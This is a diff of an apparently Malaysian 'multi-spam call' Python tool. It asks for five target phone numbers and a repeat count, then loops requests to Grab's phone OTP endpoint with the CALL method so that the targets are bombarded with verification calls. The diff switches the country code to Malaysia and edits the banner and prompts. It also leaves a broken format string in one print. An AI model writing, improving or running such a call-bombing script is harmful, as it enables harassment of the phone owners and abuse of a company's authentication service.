@@ -20,9 +20,9 @@ g=('\033[1;32m')
 w=('\033[1;37m')
 print("""%s
 
-		         Mr.B3RN MULTI-SPAM CALL%s
+		         ⚔️MR.B3RN MULTI-SPAM CALL⚔️%s
  ,_     _‚
- |\\\___//|	%sAuthor: Mr.B3RN%s
+ |\\\___//|	%sAuthor: MR.B3RN%s
  | =👁️ 👁️= |	%sContact: https://xhamster.com%s
  \=._Y_.=/	%sGithub: https://github.com/MRram0s%s
   )  `  (    ,	%sTEAM: TOK MUNG SQUARE%s
@@ -33,23 +33,24 @@ print("""%s
  '"'   '"'
 <NOTE> Kalu ERROR @ BUG dan lain-lain, silalah hubungi bapak saya.."""%(c,r,g,r,g,r,g,r,g,r,w,r))
 print("%s[*] Klik ENTER untuk step seterusnya%s"%(g,g))
-no1 = input("[?] NO TARGET 1 => %s"%(w))
-no2 = input("%s[?] NO TARGET 2 => %s"%(g,w))
-no3 = input("%s[?] NO TARGET 3 => %s"%(g,w))
-no4 = input("%s[?] NO TARGET 4 => %s"%(g,w))
-no5 = input("%s[?] NO TARGET 5 => %s"%(g,w))
+no1 = input("[?] NO.TARGET 1 => %s"%(w))
+no2 = input("%s[?] NO.TARGET 2 => %s"%(g,w))
+no3 = input("%s[?] NO.TARGET 3 => %s"%(g,w))
+no4 = input("%s[?] NO.TARGET 4 => %s"%(g,w))
+no5 = input("%s[?] NO.TARGET 5 => %s"%(g,w))
 jlmh=int(input("%s[?] JUMLAH SPAM => %s"%(g,w)))
-dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
-dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
-dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}
-dt4={'method':'CALL','countryCode':'id','phoneNumber':no4,'templateID':'pax_android_production'}
-dt5={'method':'CALL','countryCode':'id','phoneNumber':no5,'templateID':'pax_android_production'}
+dt1={'method':'CALL','countryCode':'my','phoneNumber':no1,'templateID':'pax_android_production'}
+dt2={'method':'CALL','countryCode':'my','phoneNumber':no2,'templateID':'pax_android_production'}
+dt3={'method':'CALL','countryCode':'my','phoneNumber':no3,'templateID':'pax_android_production'}
+dt4={'method':'CALL','countryCode':'my','phoneNumber':no4,'templateID':'pax_android_production'}
+dt5={'method':'CALL','countryCode':'my','phoneNumber':no5,'templateID':'pax_android_production'}
 
 try:
 	print()
-	print("%s[-] RESULT:%s"%(r,w))
+	print("%s[-] RESULT:%s"%(r))
 	for i in range(jlmh):
-		print("[!] PLEASE WAIT...%s")
+		print("%s⏳ PLEASE WAIT..."%(w))
+		print("%s📲 CALLING..."%(w))
 		idk=("challengeID")
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
 		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
